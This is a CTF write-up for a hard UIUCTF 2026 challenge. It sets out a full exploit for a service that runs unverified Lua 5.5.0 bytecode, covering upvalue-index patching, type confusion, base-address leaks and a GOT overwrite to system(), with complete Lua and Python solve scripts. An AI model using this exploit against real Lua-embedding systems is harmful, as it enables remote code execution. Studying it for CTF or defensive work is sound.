---
来源: https://ctfbase.com/writeup/20260808_uiuc2026_firefly_complete_combustion
类型: raw
获取日期: 2026-09-12
---

# Firefly: Complete Combustion (UIUCTF 2026, hard)

tags: lua, bytecode, type_confusion, upvalue, got_overwrite, arbitrary_read, arbitrary_write, pie, aslr_bypass, lua_5_5

# Firefly: Complete Combustion — UIUCTF 2026

## Description

> Elio's script never accounted for untrusted bytecode.
>
> Firefly's Complete Combustion simulator accepts one length-prefixed Lua 5.5.0 binary combat script on each connection. The usual escape hatches are gone, but the bytecode loader still trusts you completely.
>
> `ncat --ssl firefly-complete-combustion.chal.uiuc.tf 1337`

English summary: A server reads a 4-byte big-endian length followed by a Lua 5.5.0 binary bytecode chunk. It loads it with `luaL_loadbufferx(L, chunk, len, "@complete-combustion", "b")` (binary-only mode) and executes it. Available libraries: base, coroutine, table, string, math, utf8. The functions `dofile`, `load`, and `loadfile` are removed. The flag is at `/flag.txt`. The key vulnerability is that Lua 5.5.0's `luai_verifycode(L,f)` macro is defined as empty — the bytecode loader performs **no verification** of bytecode integrity.

## Analysis

### Server Setup (main.c)

The server is straightforward:
1. Reads 4-byte big-endian length (must be 4–65536)
2. Reads that many bytes of bytecode (must start with `\x1bLua` signature)
3. Loads via `luaL_loadbufferx` in binary-only mode
4. Executes with `lua_pcall`

Libraries loaded: base, coroutine, table, string, math, utf8. No `os`, `io`, `debug`, or `package` libraries. The `load`, `loadfile`, and `dofile` globals are explicitly removed, preventing source-code loading.

### The Vulnerability: Unverified Bytecode

Lua 5.5.0's bytecode loader (`luaU_undump` in `lundump.c`) trusts the bytecode completely. The `luai_verifycode(L,f)` macro that should validate bytecode integrity is defined as empty (a no-op). This means we can:

1. Compile valid Lua source with `luac` to get well-formed bytecode
2. Binary-patch specific fields (upvalue indices, constant tables, etc.)
3. Create type confusion primitives that the VM executes without complaint

### Key Lua 5.5.0 Internal Structures (x86-64)

Understanding the memory layout is critical for crafting fake objects:

```
TString (48 bytes total):
  +0:  CommonHeader (next, tt, marked) — 16 bytes
  +16: hash (4 bytes), shrlen/extra (1 byte)
  +20: padding
  +24: union { lnglen (size_t, 8 bytes) | falloc (size_t) }
  +32: contents[] — string data starts here (for long strings, contents = ts + 32)

LClosure (40 bytes):
  +0:  CommonHeader — 16 bytes
  +16: nupvalues (1 byte), gclist
  +24: p (Proto*) — pointer to function prototype
  +32: upvals[] — array of UpVal pointers

Proto (128 bytes):
  +0:  CommonHeader — 16 bytes
  ...
  +56: k (TValue*) — pointer to constants array
  +64: code (Instruction*)
  +72: p (Proto**) — sub-prototypes
  ...

CClosure (48 bytes):
  +0:  CommonHeader — 16 bytes
  +24: f (lua_CFunction) — C function pointer

TValue (16 bytes):
  +0:  value_ (Value union, 8 bytes)
  +8:  tt_ (1 byte) — type tag
  +9:  padding (7 bytes)

UpVal:
  +0:  CommonHeader — 16 bytes
  +16: v.p (TValue*) — pointer to the value
```

### Upvalue Confusion Mechanism

The core technique is **upvalue index patching**. Consider this Lua structure:

```lua
local function outer()
    local middle
    middle = function()
        local s1 = <crafted string>
        local function inner()
            middle = s1  -- SETUPVAL writes s1 to upvalue
        end
        inner()
        -- After inner() returns, cl and k are refreshed from ci->func
        local fake = "TRIGGER"  -- LOADK reads from fake k
    end
    middle()
end
```

After compilation, `inner` has an upvalue for `middle` with `(instack=1, idx=0)` — pointing to `middle`'s local variable slot. We binary-patch `idx` from `0` to `1`, redirecting it to the **closure slot** itself (where `ci->func.p` points).

When `inner()` executes `SETUPVAL`, it overwrites the active closure pointer with our TString `s1`. When `inner()` returns, the VM's `returning:` label refreshes:
- `cl = ci_func(ci)` → now points to our TString
- `cl->p` → `ts->contents` = `ts + 32` = string data (our fake Proto)
- `k = cl->p->k` → reads from offset 56 in our string data (controlled pointer)

All subsequent `LOADK` instructions read from our fake constants array.

## Solution

### Three-Phase Exploit

The exploit runs three independent upvalue confusions in sequence:

**Phase 1: Leak binary base address**
1. Create a CClosure via `coroutine.wrap(function() end)`
2. Get its address with `string.format("%p", co)` → `co_addr`
3. Build a fake TString with `contents = co_addr + 24` (pointing to `CClosure.f`)
4. Build a fake k array where every entry is a TValue pointing to the fake TString (tag `0x54` = long string)
5. Build a fake Proto with `k` pointing to the fake k array
6. Trigger upvalue confusion — `LOADK` now loads our fake long string
7. `string.byte(fake, 1, 8)` reads 8 bytes from `co_addr + 24` = `luaB_auxwrap` address
8. `bin_base = leaked_f - 0x26a00`

**Phase 2: Leak libc base address**
1. Compute `puts@GOT = bin_base + 0x3c038`
2. Same read primitive targeting `puts@GOT`
3. `libc_base = puts_libc - 0x87cc0`
4. `system_addr = libc_base + 0x58750`

**Phase 3: GOT overwrite for RCE**
1. Build a fake UpVal with `v.p = fwrite_got` (at `bin_base + 0x3c190`)
2. Build a fake LClosure where `upvals[3..5]` all point to the fake UpVal
3. Trigger upvalue confusion — the closure is now our fake LClosure
4. `mid3 = system_addr` generates `SETUPVAL` which writes `system_addr` as a TValue to `fwrite@GOT`
5. `print("cat /flag.txt")` → `lua_writestring` → `fwrite(str, 1, len, stdout)` → `system("cat /flag.txt")`

### Critical Implementation Detail

After the upvalue confusion, **ALL** `LOADK` instructions read from the fake k array. Any integer constant > 65535 uses `LOADK` instead of `LOADI`. Therefore, all large constants (GOT offsets like `0x3c038`, libc offsets like `0x87cc0`, etc.) must be pre-computed and stored in local variables **before** the confusion is triggered.

### Solve Script (stage9.lua)

```lua
-- Stage 9: Three-phase exploit
-- Phase 1: Leak CClosure.f -> compute binary base + GOT address
-- Phase 2: Read puts@GOT -> compute libc base + system address
-- Phase 3: Overwrite fwrite@GOT with system

collectgarbage("stop")

local function p64(n)
    local t = {}
    for i = 1, 8 do
        t[i] = string.char(n & 0xFF)
        n = n >> 8
    end
    return table.concat(t)
end

local function getaddr(x)
    local s = string.format("%p", x)
    return tonumber(s, 16) or tonumber(s:match("0x(%x+)"), 16) or 0
end

-- Build fake TString + fake k + fake Proto for reading 8 bytes from target_addr
local function build_read_payload(target_addr)
    local schar = string.char
    local srep = string.rep

    -- S3: fake TString with contents = target_addr
    local s3 = schar(0xFF, 0, 0, 0, 0) .. p64(0x7FFFFFFF) .. p64(target_addr) .. srep(schar(0), 43)
    local s3_addr = getaddr(s3)

    -- S2: fake k array (all entries = fake long string TValue)
    local fake_tv = p64(s3_addr + 21) .. schar(0x54) .. srep(schar(0), 7)
    local s2 = srep(fake_tv, 32)
    local s2_addr = getaddr(s2)

    -- S1: fake Proto with k = S2's string data
    return srep(schar(0), 56) .. p64(s2_addr + 32) .. srep(schar(0), 64)
end

-- Build fake UpVal + fake LClosure data for writing to target_addr
local function build_write_payload(target_addr)
    local schar = string.char
    local srep = string.rep

    -- Fake UpVal with v.p = target_addr
    local s_upval = srep(schar(0), 16) .. p64(target_addr) .. srep(schar(0), 32)
    local fake_upval_addr = getaddr(s_upval) + 32

    -- Fake LClosure: put fake_upval_addr at upvals[3..5]
    local result = srep(schar(0), 24)           -- upvals[0..2]
        .. p64(fake_upval_addr)                  -- upvals[3]
        .. p64(fake_upval_addr)                  -- upvals[4]
        .. p64(fake_upval_addr)                  -- upvals[5]
        .. srep(schar(0), 80)                    -- rest
    return result
end

-- PHASE 1: Leak CClosure.f
local bin_base = 0
local got_puts_addr = 0

local function phase1()
    local mid1
    mid1 = function()
        local prnt = print
        local sbyte = string.byte
        local getad = getaddr
        local cowrap = coroutine.wrap
        local co = cowrap(function() end)
        local co_addr = getad(co)
        local auxwrap_off = 0x26a00  -- pre-compute before confusion
        local s1 = build_read_payload(co_addr + 24)
        local function inner1()
            mid1 = s1
        end
        inner1()
        -- CONFUSION ACTIVE: LOADK reads from fake k
        local fake = "TRIGGER1"
        local b0,b1,b2,b3,b4,b5,b6,b7 = sbyte(fake, 1, 8)
        local leaked_f = b0 | (b1<<8) | (b2<<16) | (b3<<24)
                       | (b4<<32) | (b5<<40) | (b6<<48) | (b7<<56)
        local base = leaked_f - auxwrap_off
        prnt(leaked_f, base)
        return base
    end
    local r1, r2 = mid1()
    return r1, r2
end

local ok1, b = pcall(phase1)
if ok1 then
    bin_base = b
    got_puts_addr = bin_base + 0x3c038
    print("P1OK", bin_base)
end

-- PHASE 2: Read puts@GOT
local system_addr = 0
local fwrite_got = 0

local function phase2()
    local mid2
    mid2 = function()
        local prnt = print
        local sbyte = string.byte
        local gpa = got_puts_addr
        local puts_off = 0x87cc0
        local sys_off = 0x58750
        local s1 = build_read_payload(gpa)
        local function inner2()
            mid2 = s1
        end
        inner2()
        local fake = "TRIGGER2"
        local b0,b1,b2,b3,b4,b5,b6,b7 = sbyte(fake, 1, 8)
        local puts_libc = b0 | (b1<<8) | (b2<<16) | (b3<<24)
                        | (b4<<32) | (b5<<40) | (b6<<48) | (b7<<56)
        local libc_base = puts_libc - puts_off
        local sys = libc_base + sys_off
        prnt(puts_libc, sys)
        return sys
    end
    local r1, r2 = mid2()
    return r1, r2
end

if bin_base ~= 0 then
    local ok2, s = pcall(phase2)
    if ok2 then
        system_addr = s
        fwrite_got = bin_base + 0x3c190
        print("P2OK", system_addr, fwrite_got)
    end
end

-- PHASE 3: Overwrite fwrite@GOT
local function phase3()
    local mid3
    mid3 = function()
        local prnt = print
        local sys = system_addr
        local gwf = fwrite_got
        local s1 = build_write_payload(gwf)
        local function inner3()
            mid3 = s1
        end
        inner3()
        -- SETUPVAL writes system_addr to fwrite@GOT
        mid3 = sys
        prnt(1337)
        return 0
    end
    mid3()
end

if system_addr ~= 0 then
    pcall(phase3)
end

-- TRIGGER: fwrite is now system()
print("cat /flag.txt")
```

### Bytecode Patching (Python)

After compiling with `luac`, the Python patcher searches for upvalue patterns and changes `idx` from 0 to 1:

```python
#!/usr/bin/env python3
import struct, subprocess, socket, ssl

def patch_bytecode(data):
    data = bytearray(data)
    # 4-upvalue pattern for mid1/mid2: count=4 + 4 triplets ending (1,0,0)
    pat4 = bytes([0x04, 0x00,0x00,0x00, 0x00,0x01,0x00, 0x00,0x02,0x00, 0x01,0x00,0x00])
    # 5-upvalue pattern for mid3: count=5 + 5 triplets ending (1,0,0)
    pat5 = bytes([0x05, 0x00,0x00,0x00, 0x00,0x01,0x00, 0x00,0x02,0x00, 0x00,0x03,0x00, 0x01,0x00,0x00])

    for pat in [pat4, pat5]:
        pos = 0
        while True:
            idx = data.find(pat, pos)
            if idx == -1:
                break
            # Last triplet's idx byte: 2 bytes before end of pattern
            patch_off = idx + len(pat) - 2
            data[patch_off] = 1  # idx: 0 -> 1
            pos = idx + 1

    return bytes(data)

def send_exploit(bytecode, host, port=1337):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(
        socket.socket(), server_hostname=host)
    sock.connect((host, port))
    # Read banner
    banner = b""
    while b"chunk:" not in banner:
        banner += sock.recv(4096)
    # Send length-prefixed bytecode
    sock.sendall(struct.pack('>I', len(bytecode)) + bytecode)
    # Read response
    resp = b""
    while True:
        try:
            c = sock.recv(4096)
            if not c: break
            resp += c
        except: break
    sock.close()
    return resp

# Compile, patch, send
subprocess.run(["./luac", "-o", "stage9.luac", "stage9.lua"], check=True)
with open("stage9.luac", "rb") as f:
    bc = f.read()
patched = patch_bytecode(bc)
with open("stage9_patched.luac", "wb") as f:
    f.write(patched)
resp = send_exploit(patched, "firefly-complete-combustion.chal.uiuc.tf")
print(resp.decode(errors="replace"))
```

### Binary Offsets

```
firefly (PIE, statically linked Lua 5.5.0):
  luaB_auxwrap:   0x26a00  (CClosure.f for coroutine.wrap result)
  puts@GOT:       0x3c038
  fwrite@GOT:     0x3c190

libc.so.6 (provided):
  puts:           0x87cc0
  system:         0x58750
```